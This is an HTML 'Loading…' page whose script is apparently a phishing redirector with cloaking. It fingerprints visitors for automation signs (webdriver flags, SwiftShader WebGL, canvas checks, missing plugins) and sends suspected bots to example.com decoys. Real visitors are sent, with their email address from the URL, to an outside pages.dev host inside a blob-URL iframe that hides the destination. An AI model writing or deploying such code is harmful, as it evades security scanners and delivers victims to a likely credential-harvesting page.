<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loadingâ€¦</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
}
</style>
</head>

<body>

<script>
(function () {
    'use strict';

    const TARGET_BASE = "https://sa-3bk.pages.dev/";
    const FAKE_URLS = [
        "https://example.com",
        "https://www.example.org",
        "https://www.example.net"
    ];

    function detectBot() {
        let score = 0;

        const automationProps = [
            'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
            '__fxdriver_evaluate', '__driver_evaluate',
            '__webdriver_script_function',
            '__webdriver_script_fn',
            '__lastWatirAlert',
            '__lastWatirConfirm'
        ];

        automationProps.forEach(prop => {
            if (prop === 'webdriver') {
                if (navigator.webdriver === true) score += 40;
            } else if (window[prop] !== undefined) {
                score += 30;
            }
        });

        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) {
                score += 30;
            } else {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    if (
                        renderer.includes('SwiftShader') ||
                        renderer.includes('llvmpipe') ||
                        renderer.includes('Google SwiftShader')
                    ) {
                        score += 35;
                    }
                }
            }

            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("test", 2, 15);

            const dataUrl = canvas.toDataURL();
            if (!dataUrl || dataUrl.length < 100) score += 20;

        } catch {
            score += 25;
        }

        if (navigator.plugins.length === 0) score += 15;
        if (navigator.languages && navigator.languages.length === 0) score += 10;

        // FIX: do NOT penalize real Chrome
        if (!window.chrome) score += 5;

        if (!('ontouchstart' in window) && navigator.plugins.length === 0) score += 10;
        if (screen.width === 800 && screen.height === 600) score += 10;

        return score > 50;
    }

    function getEmail() {
        const p = new URLSearchParams(location.search);
        return p.get('email') || '';
    }

    function createBlob(targetUrl) {
        return new Blob([`
<!DOCTYPE html>
<html>
<body style="margin:0">
<iframe src="${targetUrl}" style="border:none;width:100vw;height:100vh"></iframe>
</body>
</html>
        `], { type: "text/html" });
    }

    function run() {
        if (detectBot()) {
            setTimeout(() => {
                location.replace(FAKE_URLS[Math.floor(Math.random() * FAKE_URLS.length)]);
            }, 600);
            return;
        }

        const email = getEmail();
        const target = email ? TARGET_BASE + "?email=" + encodeURIComponent(email) : TARGET_BASE;

        try {
            const blobUrl = URL.createObjectURL(createBlob(target));
            setTimeout(() => location.replace(blobUrl), 600);
        } catch {
            location.replace(target);
        }
    }

    document.readyState === "loading"
        ? document.addEventListener("DOMContentLoaded", run)
        : run();

})();
</script>

</body>
</html>
